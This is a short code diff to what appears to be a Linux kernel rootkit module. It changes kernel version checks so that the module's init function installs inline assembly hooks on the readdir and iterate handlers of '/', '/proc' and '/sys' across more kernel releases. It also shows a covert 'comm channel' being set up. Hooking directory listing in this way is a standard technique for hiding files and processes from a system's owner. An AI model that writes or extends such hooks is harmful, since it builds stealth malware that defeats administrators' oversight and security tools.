@@ -864,8 +864,9 @@ int init(void)
 
     pr_info("Comm channel is set up\n");
 
-#if LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)
-
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 32) && \
+      LINUX_VERSION_CODE < KERNEL_VERSION(3, 3, 0) 
+	
     asm_hook_create(get_fop("/")->readdir, root_readdir);
     asm_hook_create(get_fop("/proc")->readdir, proc_readdir);
     asm_hook_create(get_fop("/sys")->readdir, sys_readdir);
@@ -874,7 +875,7 @@ int init(void)
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
     LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
 */
-#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 0, 0) && \
+#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 3, 0) && \
       LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0) 
 
     asm_hook_create(get_fop("/")->iterate, root_iterate);
